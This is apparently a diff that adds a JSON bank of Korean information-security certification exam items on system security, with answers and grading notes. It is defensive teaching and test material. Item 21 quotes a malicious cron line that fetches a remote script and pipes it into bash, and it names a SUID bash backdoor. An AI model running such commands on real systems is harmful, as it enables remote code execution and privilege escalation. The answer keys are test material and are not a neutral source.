@@ -1,0 +1,367 @@
+{
+  "domain": "시스템보안",
+  "items": [
+    {
+      "id": "y-sys-001",
+      "type": "단답형",
+      "question": "리눅스 로그 파일에 대한 설명이다. 빈칸 (A), (B), (C)에 해당하는 파일명을 쓰시오.\n\n* (A) : 성공한 로그인 기록. `last` 명령으로 조회하며 바이너리 형식이다.\n* (B) : 실패한 로그인 시도 기록. `lastb` 명령으로 조회한다.\n* (C) : 사용자별 최종 로그인 시각 기록. `lastlog` 명령으로 조회한다.",
+      "answer": "정답\n(A) /var/log/wtmp\n(B) /var/log/btmp\n(C) /var/log/lastlog",
+      "explanation": "리눅스 로그인 관련 3대 바이너리 로그.\n- **wtmp**: 성공 로그인/로그아웃·부팅·종료 이력 → `last`\n- **btmp**: 로그인 실패(무차별 대입 탐지 핵심) → `lastb`\n- **lastlog**: 계정별 마지막 로그인 → `lastlog`\n- 참고: `utmp`(/var/run/utmp)는 현재 로그인 중인 사용자 → `who`, `w`\n- 텍스트 로그는 `/var/log/secure`(RHEL)·`/var/log/auth.log`(Debian).",
+      "notes": [
+        "시스템보안/리눅스-유닉스-로그파일"
+      ],
+      "tags": [
+        "로그",
+        "wtmp",
+        "btmp",
+        "lastlog"
+      ]
+    },
+    {
+      "id": "y-sys-002",
+      "type": "단답형",
+      "question": "다음은 UNIX/Linux `/etc/shadow` 파일의 한 줄이다. 콜론으로 구분된 각 필드 중 3~5번째 필드의 의미를 순서대로 쓰시오.\n\n`user1:$6$abcd$xyz...:19700:1:90:7:14::`",
+      "answer": "정답\n3번째(19700) : 마지막 패스워드 변경일 (1970-01-01 기준 경과 일수)\n4번째(1) : 패스워드 변경 후 다시 변경까지의 최소 사용일수(Minimum)\n5번째(90) : 패스워드 최대 사용일수(Maximum) — 만료까지 기간",
+      "explanation": "`/etc/shadow` 필드: ①계정명 ②암호화 패스워드 ③마지막 변경일 ④최소 변경일수 ⑤최대 사용일수 ⑥만료 경고일수 ⑦만료 후 비활성(유예)일수 ⑧계정 만료일 ⑨예약.\n⑤(Maximum)은 패스워드 주기적 변경 정책의 핵심. `chage -M 90 user1` 로 설정. `$6$`는 SHA-512 해시.",
+      "notes": [
+        "시스템보안/passwd-shadow-파일구조",
+        "시스템보안/윈도우-계정-감사정책"
+      ],
+      "tags": [
+        "shadow",
+        "패스워드정책",
+        "chage"
+      ]
+    },
+    {
+      "id": "y-sys-003",
+      "type": "단답형",
+      "question": "리눅스에서 특수 권한 비트에 대한 물음이다. 빈칸을 채우시오.\n\n* 파일에 ( A ) 비트가 설정되면 실행 시 파일 소유자의 권한으로 동작한다. `passwd` 명령이 대표적이다. 8진수로 4000.\n* 디렉터리에 ( B ) 비트가 설정되면 그 안의 파일은 소유자·root 만 삭제할 수 있다. `/tmp` 가 대표적이다. 8진수로 1000.",
+      "answer": "정답\n(A) SetUID (SUID)\n(B) Sticky Bit",
+      "explanation": "- **SUID(4000)**: 실행 순간 EUID 가 파일 소유자로 상승. `-rwsr-xr-x`. 악용 시 권한 상승 → 불필요 SUID 파일은 `find / -perm -4000` 로 점검·제거.\n- **SGID(2000)**: 그룹 권한으로 실행 / 디렉터리는 하위 파일 그룹 상속.\n- **Sticky Bit(1000)**: 공용 디렉터리에서 타인 파일 삭제 방지. `drwxrwxrwt`.",
+      "notes": [
+        "시스템보안/특수권한-umask"
+      ],
+      "tags": [
+        "SUID",
+        "SGID",
+        "stickybit",
+        "권한상승"
+      ]
+    },
+    {
+      "id": "y-sys-004",
+      "type": "단답형",
+      "question": "umask 값이 022 일 때, 새로 생성되는 (A) 파일과 (B) 디렉터리의 8진수 접근권한을 각각 구하시오. (파일 기본 666, 디렉터리 기본 777)",
+      "answer": "정답\n(A) 파일 : 644 (rw-r--r--)\n(B) 디렉터리 : 755 (rwxr-xr-x)",
+      "explanation": "umask 는 기본 권한에서 '빼는' 마스크. 파일 666 - 022 = 644, 디렉터리 777 - 022 = 755.\n보안 강화 시 umask 027(파일 640·디렉터리 750) 또는 077 사용. `/etc/profile`·`/etc/bashrc` 에 설정.",
+      "notes": [
+        "시스템보안/특수권한-umask"
+      ],
+      "tags": [
+        "umask",
+        "권한계산"
+      ]
+    },
+    {
+      "id": "y-sys-005",
+      "type": "단답형",
+      "question": "다음 설명에 해당하는 리눅스 파일시스템의 특수 파일/디렉터리 이름을 쓰시오.\n\n* (A) : 커널이 제공하는 가상 파일시스템으로, 프로세스 정보(PID 디렉터리)와 시스템 정보(cpuinfo, meminfo 등)를 담는다.\n* (B) : 프로세스가 열고 있는 파일 디스크립터를 심볼릭 링크로 보여주는 (A) 하위 디렉터리. 삭제된 악성코드 실행 파일 복구에 활용된다.",
+      "answer": "정답\n(A) /proc\n(B) /proc/[PID]/fd",
+      "explanation": "`/proc` 는 메모리 상의 가상 FS. `/proc/[PID]/fd/` 로 삭제된(deleted) 실행 파일을 `cp` 로 복구 가능(파일 핸들이 살아있는 동안). `/proc/[PID]/exe`, `/proc/[PID]/maps`, `/proc/[PID]/cmdline` 도 침해대응·포렌식에 필수.",
+      "notes": [
+        "시스템보안/리눅스-파일시스템-proc-셸"
+      ],
+      "tags": [
+        "proc",
+        "포렌식",
+        "fd"
+      ]
+    },
+    {
+      "id": "y-sys-006",
+      "type": "단답형",
+      "question": "cron 관련 물음이다.\n\n* 시스템 전역 cron 설정 파일의 경로는 ( A ) 이다.\n* 특정 사용자의 cron 사용을 허용/차단하는 파일은 각각 ( B ), ( C ) 이다. (경로 포함)",
+      "answer": "정답\n(A) /etc/crontab\n(B) /etc/cron.allow\n(C) /etc/cron.deny",
+      "explanation": "cron.allow 가 존재하면 그 목록의 사용자만 cron 사용 가능(deny 무시). cron.allow 가 없고 cron.deny 만 있으면 deny 목록 외 모두 허용. 둘 다 없으면 root 만(배포판에 따라 전체). at 명령은 `/etc/at.allow`·`/etc/at.deny`. cron 은 백도어 지속(persistence)에 악용되므로 크론탭 정기 점검 필요.",
+      "notes": [
+        "시스템보안/crontab-xinetd-보안"
+      ],
+      "tags": [
+        "cron",
+        "crontab",
+        "persistence"
+      ]
+    },
+    {
+      "id": "y-sys-007",
+      "type": "단답형",
+      "question": "슈퍼 데몬 `xinetd` 의 서비스 설정에서, 특정 IP 대역만 접속을 허용하거나 차단할 때 사용하는 속성 두 가지를 쓰시오.",
+      "answer": "정답\nonly_from (허용 대역), no_access (차단 대역)",
+      "explanation": "`/etc/xinetd.d/서비스` 파일에서 `only_from = 192.168.1.0/24`, `no_access = 192.168.1.100` 형태. TCP Wrapper(`/etc/hosts.allow`·`/etc/hosts.deny`, libwrap)로도 유사 제어. `access_times` 로 접속 허용 시간대도 제한 가능. 불필요한 xinetd 서비스(telnet, rsh 등)는 `disable = yes`.",
+      "notes": [
+        "시스템보안/crontab-xinetd-보안"
+      ],
+      "tags": [
+        "xinetd",
+        "TCPWrapper",
+        "접근제어"
+      ]
+    },
+    {
+      "id": "y-sys-008",
+      "type": "단답형",
+      "question": "무결성 점검 도구에 대한 설명이다. 빈칸을 채우시오.\n\n* 파일의 해시·크기·권한·소유자·inode 등을 DB로 만들어 두고, 이후 변조 여부를 비교 검출하는 대표적 HIDS 도구는 ( A ) 이다.\n* ( A ) 가 변조 탐지를 위해 파일마다 계산해 저장하는 값의 종류로, MD5·SHA-256 등이 있는 것을 ( B ) 값이라 한다.",
+      "answer": "정답\n(A) Tripwire\n(B) 해시(체크섬, 무결성 검증값)",
+      "explanation": "Tripwire: 기준 DB(baseline) 생성 → 정기 스캔으로 무단 변경 탐지. AIDE 는 오픈소스 대안. 시스템 명령어 무결성이 이미 깨졌을 수 있으므로 DB·바이너리는 읽기전용 매체(WORM)에 보관. 루트킷 탐지는 chkrootkit·rkhunter.",
+      "notes": [
+        "시스템보안/무결성점검과-악성코드-분석"
+      ],
+      "tags": [
+        "Tripwire",
+        "무결성",
+        "HIDS",
+        "AIDE"
+      ]
+    },
+    {
+      "id": "y-sys-009",
+      "type": "단답형",
+      "question": "버퍼 오버플로우 공격 방어 기법에 대한 물음이다.\n\n* 스택에 임의의 난수 값을 삽입해 두고 함수 리턴 전 변조 여부를 확인하는 기법은 ( A ) 이다.\n* 스택·힙 영역에 실행 권한을 제거해 셸코드 실행을 막는 CPU/OS 기능은 ( B ) 이다. (약어)\n* 라이브러리·스택·힙의 메모리 적재 주소를 실행 시마다 무작위화하는 기법은 ( C ) 이다. (약어)",
+      "answer": "정답\n(A) 스택 카나리(Stack Canary / Stack Guard)\n(B) DEP (Data Execution Prevention) / NX bit\n(C) ASLR (Address Space Layout Randomization)",
+      "explanation": "- **Canary**: 리턴 주소 앞 카나리 값 훼손 시 abort → 스택 스매싱 탐지.\n- **DEP/NX**: W^X 원칙. 데이터 영역 코드 실행 차단 → ROP 로 우회 시도.\n- **ASLR**: 주소 예측 불가화. Canary+DEP+ASLR 조합이 기본 방어. 컴파일 시 `-fstack-protector`, `-D_FORTIFY_SOURCE=2`, `-pie` 적용.",
+      "notes": [
+        "시스템보안/버퍼오버플로우-방어기법"
+      ],
+      "tags": [
+        "BOF",
+        "카나리",
+        "DEP",
+        "ASLR",
+        "NX"
+      ]
+    },
+    {
+      "id": "y-sys-010",
+      "type": "단답형",
+      "question": "윈도우 이벤트 로그에서 다음 이벤트 ID의 의미를 쓰시오. (Windows Vista/2008 이후 보안 로그 기준)\n\n* 4624 : ( A )\n* 4625 : ( B )\n* 4672 : ( C )",
+      "answer": "정답\n(A) 계정 로그온 성공\n(B) 계정 로그온 실패\n(C) 특수 권한(관리자 권한 등)이 부여된 로그온",
+      "explanation": "- 4624/4625 의 '로그온 유형'이 중요: 2(대화형), 3(네트워크), 10(RDP), 5(서비스).\n- 4672: 관리자 그룹 계정 로그온 시 함께 발생 → 4624+4672 조합으로 관리자 접속 탐지.\n- 기타: 4720(계정 생성), 4726(삭제), 4732(그룹 추가), 4688(프로세스 생성), 1102(감사 로그 삭제).",
+      "notes": [
+        "시스템보안/윈도우-보안-pe-이벤트로그-netbios",
+        "시스템보안/윈도우-계정-감사정책"
+      ],
+      "tags": [
+        "윈도우",
+        "이벤트로그",
+        "4624",
+        "4625"
+      ]
+    },
+    {
+      "id": "y-sys-011",
+      "type": "단답형",
+      "question": "윈도우 인증에서 사용되는 다음 용어를 쓰시오.\n\n* 로컬 계정의 패스워드 해시가 저장되는 파일(레지스트리 하이브)은 ( A ) 이다.\n* 과거 호환용으로 취약해 크래킹이 쉬운 해시는 ( B ) 이며, 현재 기본은 ( C ) 해시이다.",
+      "answer": "정답\n(A) SAM (Security Account Manager)\n(B) LM (LAN Manager) 해시\n(C) NTLM(NT 해시, MD4 기반)",
+      "explanation": "SAM 파일: `%SystemRoot%\\System32\\config\\SAM`. LM 해시는 14자 이하·대문자 변환·7자 분할로 매우 취약 → 그룹 정책으로 'LM 해시 저장 안 함' 설정. NTLM 도 Pass-the-Hash 공격 대상 → Kerberos·Credential Guard 권장. 도메인 계정 해시는 NTDS.dit.",
+      "notes": [
+        "시스템보안/윈도우-보안-pe-이벤트로그-netbios",
+        "시스템보안/passwd-shadow-파일구조"
+      ],
+      "tags": [
+        "SAM",
+        "LM해시",
+        "NTLM",
+        "PassTheHash"
+      ]
+    },
+    {
+      "id": "y-sys-012",
+      "type": "단답형",
+      "question": "엔드포인트 보안 솔루션에 대한 설명이다. 빈칸에 들어갈 용어(약어)를 쓰시오.\n\n* ( A ) : 내부 정보(개인정보·기밀)가 이메일·USB·출력·클라우드 등으로 유출되는 것을 탐지·차단.\n* ( B ) : 엔드포인트의 행위를 지속 수집·분석해 침해를 탐지하고 대응(격리·롤백)하는 솔루션. 기존 백신을 넘어선 위협 헌팅 지원.",
+      "answer": "정답\n(A) DLP (Data Loss Prevention)\n(B) EDR (Endpoint Detection and Response)",
+      "explanation": "- **DLP**: 콘텐츠 인식(패턴·지문·정규식)으로 채널별 유출 통제. 네트워크 DLP + 엔드포인트 DLP.\n- **EDR**: 행위 기반 탐지·타임라인·원격 격리. XDR(네트워크·클라우드·메일까지 확장), MDR(관제 서비스형)로 발전.\n- NAC(단말 접속 통제), MDM(모바일 관리)과 조합.",
+      "notes": [
+        "시스템보안/엔드포인트-dlp-byod-보안솔루션"
+      ],
+      "tags": [
+        "DLP",
+        "EDR",
+        "XDR",
+        "엔드포인트"
+      ]
+    },
+    {
+      "id": "y-sys-013",
+      "type": "단답형",
+      "question": "컨테이너·가상화 보안에 대한 물음이다.\n\n* 컨테이너가 호스트 커널을 공유하는 특성상, 컨테이너를 탈출해 호스트 권한을 획득하는 공격을 ( A ) 라 한다.\n* 컨테이너를 root 가 아닌 일반 사용자 권한으로 실행하거나 위험 capability 를 제거하는 원칙을 ( B ) 원칙이라 한다.",
+      "answer": "정답\n(A) 컨테이너 탈출(Container Escape / Breakout)\n(B) 최소 권한(Least Privilege) — rootless·비특권 컨테이너",
+      "explanation": "컨테이너는 하이퍼바이저 없이 커널 공유 → 격리 수준이 VM 보다 약함. 방어: 비특권(rootless) 실행, `--privileged` 금지, capabilities drop, seccomp·AppArmor·SELinux 프로파일, 읽기전용 파일시스템, 신뢰된 이미지(서명·스캔), 네임스페이스·cgroup 격리.",
+      "notes": [
+        "시스템보안/클라우드-가상화-컨테이너-보안"
+      ],
+      "tags": [
+        "컨테이너",
+        "탈출",
+        "seccomp",
+        "capability"
+      ]
+    },
+    {
+      "id": "y-sys-014",
+      "type": "서술형",
+      "question": "리눅스 시스템에서 SetUID 가 설정된 파일이 보안 위협이 되는 이유를 설명하고, SetUID 파일에 대한 점검·관리 방안을 3가지 이상 서술하시오.",
+      "answer": "정답\n[위협 이유]\n- SetUID 파일 실행 시 실행 프로세스의 EUID 가 파일 소유자(주로 root)로 상승한다.\n- 해당 프로그램에 버퍼 오버플로우·명령어 삽입·심볼릭 링크 등 취약점이 있으면, 일반 사용자가 이를 악용해 root 권한 셸을 획득(권한 상승)할 수 있다.\n- 공격자가 백도어로 /bin/bash 등에 SetUID 를 몰래 설정해 두면 언제든 root 권한을 얻는 지속 통로가 된다.\n\n[점검·관리 방안]\n1. 전체 SetUID/SetGID 파일 목록화: `find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\;` 를 정기 실행하고 기준 목록과 비교(신규 발견 시 조사).\n2. 불필요한 SetUID 제거: 업무상 필요 없는 파일은 `chmod u-s` 로 권한 해제(예: dump, restore, mount 등).\n3. 무결성 감시: Tripwire/AIDE 로 SetUID 파일의 해시·권한 변경을 탐지.\n4. 필요한 SetUID 파일은 최신 패치 유지, 별도 파티션에 `nosuid` 마운트 옵션 적용(임시·홈·외부매체).\n5. 소유자·경로 검증: SetUID 인데 소유자가 root 가 아니거나 임시 디렉터리에 있는 파일은 즉시 격리.",
+      "explanation": "채점 포인트: ①권한 상승 원리(EUID) ②취약점 악용/백도어 시나리오 ③find 로 목록화 ④불필요 권한 제거 ⑤무결성 감시/패치/nosuid 중 3개 이상. 'SGID·Sticky' 혼동 주의.",
+      "notes": [
+        "시스템보안/특수권한-umask",
+        "시스템보안/유닉스-시스템-하드닝"
+      ],
+      "tags": [
+        "SUID",
+        "하드닝",
+        "권한상승"
+      ]
+    },
+    {
+      "id": "y-sys-015",
+      "type": "서술형",
+      "question": "리눅스 서버가 침해된 것으로 의심될 때, 재부팅하기 전에 휘발성 데이터를 수집해야 하는 이유를 설명하고, 수집해야 할 휘발성 정보와 해당 명령어를 4가지 이상 제시하시오.",
+      "answer": "정답\n[재부팅 전 수집 이유]\n- 메모리·네트워크 연결·실행 중 프로세스 등 휘발성 데이터는 전원 차단/재부팅 시 소실되며, 증거의 최우선 수집 순서(Order of Volatility)에서 가장 먼저 확보해야 한다.\n- 파일리스(fileless) 악성코드·인메모리 셸코드는 디스크에 흔적이 없어 메모리 분석이 유일한 단서일 수 있다.\n\n[수집 대상과 명령]\n1. 현재 시각·업타임: `date`, `uptime`\n2. 로그인·세션 정보: `who`, `w`, `last`, `lastlog`\n3. 실행 중 프로세스: `ps -ef`, `ps auxww`, `pstree`, `/proc/[PID]/` 확인\n4. 네트워크 연결·포트: `netstat -antup`(또는 `ss -antup`), `lsof -i`, `arp -a`, `route`\n5. 열린 파일·삭제된 실행 파일: `lsof`, `lsof +L1`, `/proc/[PID]/exe`\n6. 커널 모듈·예약 작업: `lsmod`, `crontab -l`, `cat /etc/crontab`\n7. 메모리 덤프: LiME 등으로 물리 메모리 이미지 확보\n\n외부 저장매체에 결과를 저장하고, 신뢰할 수 있는(정적 컴파일) 바이너리를 사용하며, 수집 과정을 해시와 함께 기록해 무결성을 보장한다.",
+      "explanation": "채점 포인트: ①휘발성 소실·Order of Volatility ②파일리스 대응 ③프로세스·네트워크·세션·메모리 중 4개 이상 명령 ④신뢰 바이너리/외부매체/해시 기록. `dd` 로 디스크 이미지는 '비휘발성' 단계.",
+      "notes": [
+        "시스템보안/리눅스-파일시스템-proc-셸",
+        "정보보안관리및법규/침해사고대응-디지털포렌식"
+      ],
+      "tags": [
+        "침해대응",
+        "휘발성",
+        "포렌식",
+        "Order of Volatility"
+      ]
+    },
+    {
+      "id": "y-sys-016",
+      "type": "서술형",
+      "question": "패스워드 크래킹 공격 중 '사전 공격(Dictionary Attack)', '무차별 대입 공격(Brute Force)', '레인보우 테이블 공격'의 원리를 각각 설명하고, 레인보우 테이블 공격을 무력화하는 대응책을 서술하시오.",
+      "answer": "정답\n[사전 공격] 자주 쓰이는 단어·유출된 패스워드 목록(사전)을 순차 대입한다. 빠르지만 사전에 없는 패스워드는 못 뚫는다.\n\n[무차별 대입] 가능한 모든 문자 조합을 전수 대입한다. 반드시 성공하지만 길이·복잡도가 커지면 시간이 지수적으로 증가한다.\n\n[레인보우 테이블] 평문→해시를 미리 계산해 '체인' 형태로 압축 저장해 둔 표를 이용, 탈취한 해시값을 역조회해 평문을 빠르게 찾는다. 사전 계산으로 시간을 대폭 단축한다.\n\n[대응책 — 솔트(Salt)]\n- 사용자마다 서로 다른 무작위 솔트를 패스워드에 결합해 해시하면, 같은 패스워드라도 해시값이 달라져 미리 만든 레인보우 테이블이 무력화된다.\n- 추가로 키 스트레칭(bcrypt, PBKDF2, scrypt, Argon2)으로 해시 계산을 의도적으로 느리게 하고, 계정 잠금(임계치 초과 시), 다중 인증(MFA), 복잡도·길이 정책을 병행한다.",
+      "explanation": "채점 포인트: 세 공격의 원리 구분 + 레인보우 테이블 대응의 핵심은 '사용자별 랜덤 솔트'(유니크 솔트). 키 스트레칭·MFA·계정 잠금은 가점. '해시를 여러 번' 만으로는 부족(솔트 없으면 테이블 재생성 가능).",
+      "notes": [
+        "시스템보안/passwd-shadow-파일구조",
+        "정보보안일반/해시함수-mac-키관리"
+      ],
+      "tags": [
+        "패스워드크래킹",
+        "레인보우테이블",
+        "솔트",
+        "키스트레칭"
+      ]
+    },
+    {
+      "id": "y-sys-017",
+      "type": "서술형",
+      "question": "IoT/ICS(산업제어시스템) 환경이 일반 IT 환경과 다른 보안 특성을 3가지 설명하고, ICS 보안을 위한 대응 방안을 서술하시오.",
+      "answer": "정답\n[특성]\n1. 가용성 최우선: IT 는 기밀성 중심이지만 ICS 는 가용성·안전(Safety)이 최우선이라, 임의 패치·재부팅·스캔이 공정 중단·인명 사고로 이어질 수 있다.\n2. 긴 수명·레거시: 장비 수명이 10~20년으로 길고, 지원 종료(EoS) OS·독자 프로토콜(Modbus, DNP3, PROFINET 등 대개 암호화·인증 없음)을 사용한다.\n3. 실시간성·제한된 자원: 지연에 민감하고 CPU·메모리가 작아 무거운 보안 에이전트 탑재가 어렵다.\n4. 물리 프로세스 연계: 사이버 공격이 물리적 파괴(Stuxnet)로 직결된다.\n\n[대응 방안]\n- 망분리·계층 분리: Purdue 모델 기반으로 IT/OT 경계에 방화벽·단방향 게이트웨이(Data Diode) 배치, DMZ 구성.\n- 화이트리스트 기반 접근통제·애플리케이션 제어, 원격 접속은 점프서버+MFA.\n- 패시브 모니터링(트래픽 미러링)으로 공정 영향 없이 이상 탐지, 자산 인벤토리 관리.\n- 패치는 벤더 검증 후 정기 유지보수 창(shutdown window)에 적용, 불가 시 보완통제.\n- 안전계장시스템(SIS)은 제어망과 분리.",
+      "explanation": "채점 포인트: ①가용성·안전 우선(CIA 우선순위 A>I>C) ②레거시·비암호 프로토콜 ③실시간·저사양 ④물리 피해 중 3개 + Purdue/망분리·단방향·패시브 모니터링·화이트리스트 중심 대응.",
+      "notes": [
+        "시스템보안/iot-ics-scada-보안"
+      ],
+      "tags": [
+        "ICS",
+        "SCADA",
+        "OT보안",
+        "Purdue",
+        "Stuxnet"
+      ]
+    },
+    {
+      "id": "y-sys-018",
+      "type": "서술형",
+      "question": "리눅스 서버 하드닝(Hardening) 관점에서, 신규 서버 구축 시 적용해야 할 계정·인증 관련 보안 설정을 5가지 이상 구체적으로 서술하시오.",
+      "answer": "정답\n1. root 직접 로그인 차단: SSH `PermitRootLogin no`, 콘솔은 `/etc/securetty` 제한. 관리 작업은 일반 계정 로그인 후 `su`/`sudo`.\n2. su 사용 제한: `wheel` 그룹만 su 가능하도록 `/etc/pam.d/su` 에서 `pam_wheel.so` 활성화.\n3. 불필요 계정·그룹 제거 또는 로그인 셸을 `/sbin/nologin` 으로: lp, sync, shutdown, games 등 시스템 계정.\n4. 패스워드 정책: `/etc/login.defs` 의 PASS_MAX_DAYS(90)·PASS_MIN_LEN, `pam_pwquality`(복잡도·이전 패스워드 재사용 금지), `pam_faillock`(로그인 실패 임계치 초과 시 잠금).\n5. 패스워드 없는 계정·UID 0 중복 계정 점검: `awk -F: '($2==\"\"){print}' /etc/shadow`, `awk -F: '($3==0){print}' /etc/passwd`.\n6. SSH 키 인증 전환 + 패스워드 인증 비활성(`PasswordAuthentication no`), Protocol 2, 접속 IP 제한(AllowUsers/방화벽).\n7. 세션 타임아웃(`TMOUT`), 로그인 배너(`/etc/issue.net`), sudo 로깅.",
+      "explanation": "채점 포인트: root 로그인 차단 / su 제한(wheel) / 불필요 계정 nologin / 패스워드 정책(login.defs·PAM) / 빈 패스워드·UID0 중복 점검 / SSH 키 인증 중 5개 이상. 'chmod 777' 같은 오답 배제.",
+      "notes": [
+        "시스템보안/유닉스-시스템-하드닝",
+        "시스템보안/passwd-shadow-파일구조"
+      ],
+      "tags": [
+        "하드닝",
+        "PAM",
+        "SSH",
+        "sudo"
+      ]
+    },
+    {
+      "id": "y-sys-019",
+      "type": "실무형",
+      "question": "리눅스 서버의 `/var/log/secure` 에서 아래와 같은 로그가 대량으로 확인되었다.\n\n```\nJul 10 02:11:03 srv sshd[2841]: Failed password for invalid user admin from 203.0.113.55 port 51234 ssh2\nJul 10 02:11:05 srv sshd[2843]: Failed password for invalid user root from 203.0.113.55 port 51240 ssh2\nJul 10 02:11:07 srv sshd[2845]: Failed password for root from 203.0.113.55 port 51255 ssh2\n... (수백 건 반복)\nJul 10 02:19:42 srv sshd[3120]: Accepted password for oracle from 203.0.113.55 port 52001 ssh2\n```\n\n(a) 이 로그가 나타내는 공격 유형을 쓰시오.\n(b) 로그 분석 결과 공격이 성공했는지 판단하고 근거를 쓰시오.\n(c) 재발 방지를 위한 SSH 서버 설정·네트워크 대응책을 3가지 이상 제시하시오.",
+      "answer": "정답\n(a) SSH 무차별 대입(Brute Force) / 패스워드 추측 공격.\n\n(b) 공격 성공. 근거: 동일 출발지 IP(203.0.113.55)에서 수백 건의 `Failed password` 이후 `Accepted password for oracle` 로그가 확인됨 → oracle 계정 패스워드가 탈취되어 인증에 성공했다.\n\n(c)\n1. 패스워드 인증 비활성화, 공개키 인증만 허용: `PasswordAuthentication no`, `PubkeyAuthentication yes`.\n2. root 로그인 차단(`PermitRootLogin no`), 접속 허용 계정·IP 제한(`AllowUsers`, 방화벽/보안그룹에서 관리자 IP 만 22 허용), 기본 포트 변경.\n3. 실패 임계치 기반 자동 차단: fail2ban 또는 `sshd` `MaxAuthTries`/`LoginGraceTime` 축소, `pam_faillock` 계정 잠금.\n4. 침해 대응: oracle 계정 즉시 잠금·패스워드 변경, 해당 세션·크론탭·인증키(`~/.ssh/authorized_keys`)·프로세스 점검, 로그 전체 확보.\n5. MFA(OTP) 적용, 접속기록 중앙 로그 서버로 전송·모니터링.",
+      "explanation": "채점 포인트: (a) Brute Force (b) 'Accepted password' 로그로 성공 판정(단순 '실패 많음'만이면 감점) (c) 키 인증·IP제한·fail2ban·MFA·침해계정 조치 중 3개. oracle 계정 사후 조치를 놓치기 쉬움.",
+      "notes": [
+        "시스템보안/리눅스-유닉스-로그파일",
+        "시스템보안/유닉스-시스템-하드닝"
+      ],
+      "tags": [
+        "SSH",
+        "BruteForce",
+        "로그분석",
+        "fail2ban"
+      ]
+    },
+    {
+      "id": "y-sys-020",
+      "type": "실무형",
+      "question": "윈도우 서버에서 침해사고 조사 중 다음이 발견되었다.\n\n- `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` 에 `svch0st = C:\\Users\\Public\\svch0st.exe` 값 존재\n- 작업 스케줄러에 매 30분마다 위 파일을 실행하는 작업 등록\n- `netstat -ano` 결과 해당 PID 가 185.220.101.x:443 으로 ESTABLISHED\n- 백신은 탐지하지 못함\n\n(a) 공격자가 사용한 '지속성(Persistence)' 기법 2가지를 쓰시오.\n(b) 185.220.101.x 로의 연결이 의미하는 것을 쓰시오.\n(c) 이 악성코드가 백신에 탐지되지 않는 이유로 가능한 것 2가지와, 대응 방안을 서술하시오.",
+      "answer": "정답\n(a) ① Run 레지스트리 키를 이용한 자동 실행 등록 ② 작업 스케줄러(Scheduled Task) 등록. (정상 프로세스명 svchost 를 흉내 낸 svch0st 사용 = 위장/타이포스쿼팅)\n\n(b) C2(명령제어) 서버와의 아웃바운드 통신(비커닝). 443 포트로 HTTPS 를 가장해 탐지를 회피. 185.220.101.x 대역은 Tor 출구 노드로 알려져 익명화된 C2 가능성.\n\n(c) [미탐 이유]\n1. 신종/변종이라 시그니처 미등록(제로데이), 패커·난독화·크립터로 시그니처 회피.\n2. 파일리스/합법 도구 악용(LOLBins), 코드 인젝션으로 정상 프로세스에 숨음. AV 예외 폴더 등록.\n\n[대응 방안]\n- 네트워크 격리 후 조사(전원 유지, 휘발성 수집).\n- Run 키 값·스케줄 작업 삭제, svch0st.exe 격리·해시 산출 후 샌드박스/멀웨어 분석 의뢰, 방화벽/프록시에서 C2 IP·도메인 차단.\n- EDR 도입(행위 기반 탐지), 위협 인텔리전스(해시·IP)로 조직 내 확산 여부 스윕, 계정 패스워드 재설정, OS 재설치 권고.\n- 아웃바운드 트래픽 화이트리스트·프록시 강제, 이상 비커닝 탐지.",
+      "explanation": "채점 포인트: (a) Run키 + 스케줄 작업(또는 서비스 등록) (b) C2 아웃바운드·Tor·443 위장 (c) 시그니처 한계·난독화/파일리스 + EDR·격리·C2 차단·확산 스윕. svch0st(0) 위장 언급 시 가점.",
+      "notes": [
+        "시스템보안/윈도우-보안-pe-이벤트로그-netbios",
+        "시스템보안/무결성점검과-악성코드-분석",
+        "네트워크보안/apt-킬체인-악성코드"
+      ],
+      "tags": [
+        "윈도우",
+        "persistence",
+        "C2",
+        "악성코드",
+        "EDR"
+      ]
+    },
+    {
+      "id": "y-sys-021",
+      "type": "실무형",
+      "question": "리눅스 웹서버에서 아래 명령 결과가 확인되었다.\n\n```\n# ls -l /bin/bash\n-rwsr-xr-x 1 root root 1234376  ... /bin/bash\n# find / -perm -4000 -newer /etc/hostname -type f 2>/dev/null\n/bin/bash\n/tmp/.x/pkexec\n# crontab -l -u www-data\n*/5 * * * * curl -s http://198.51.100.9/a.sh | bash\n```\n\n(a) `/bin/bash` 의 권한에서 발견되는 문제를 쓰시오.\n(b) www-data 크론탭이 수행하는 행위와 위험을 설명하시오.\n(c) 이 서버에서 즉시 취해야 할 조치를 순서대로 5가지 이상 제시하시오.",
+      "answer": "정답\n(a) `/bin/bash` 에 SetUID(rws) 비트가 설정되어 있다. 정상 시스템에서 bash 는 SetUID 가 없어야 하며, 이 상태에서는 일반 사용자가 `bash -p` 로 root 권한 셸을 획득할 수 있다(공격자가 심어둔 권한 상승 백도어).\n\n(b) www-data 계정 크론이 5분마다 외부(198.51.100.9)에서 셸 스크립트를 내려받아 즉시 실행한다. 공격자가 원격에서 임의 명령을 지속 주입할 수 있는 다운로더/백도어이며, `/tmp/.x/pkexec` 는 PwnKit(CVE-2021-4034) 등 권한상승 익스플로잇으로 의심된다.\n\n(c)\n1. 서버를 네트워크에서 격리(방화벽 차단)하고 스냅샷/디스크 이미지·휘발성 데이터 확보.\n2. 악성 크론 제거: `crontab -r -u www-data`, `/etc/cron.*`·`/var/spool/cron` 전수 점검.\n3. `/bin/bash` SetUID 제거(`chmod u-s /bin/bash`) 또는 신뢰 패키지로 재설치, `/tmp/.x` 등 의심 파일 격리.\n4. 방화벽·프록시에서 198.51.100.9 및 관련 IP 차단, 웹 접근 로그로 최초 침투 경로(웹셸·취약점) 파악.\n5. 전체 SetUID/SGID·계정(UID 0·신규 계정)·authorized_keys·서비스·시작 스크립트 무결성 점검.\n6. 관련 계정 패스워드·키 전면 교체, 취약 소프트웨어 패치(polkit 등).\n7. 근본적으로 신뢰 불가 → OS 재설치 및 검증된 백업으로 복구, 재발방지 대책 수립.",
+      "explanation": "채점 포인트: (a) bash SetUID = 권한상승 백도어, `bash -p` (b) 원격 다운로더 크론 + pkexec 권한상승 (c) 격리·증거보전 → 크론 제거 → SetUID 원복 → C2 차단·침투경로 → 무결성 점검 → 계정/패치 → 재설치. 순서·완전성.",
+      "notes": [
+        "시스템보안/특수권한-umask",
+        "시스템보안/crontab-xinetd-보안",
+        "애플리케이션보안/아파치-웹서버-보안설정과-로그"
+      ],
+      "tags": [
+        "권한상승",
+        "SUID",
+        "크론백도어",
+        "PwnKit",
+        "침해대응"
+      ]
+    },
+    {
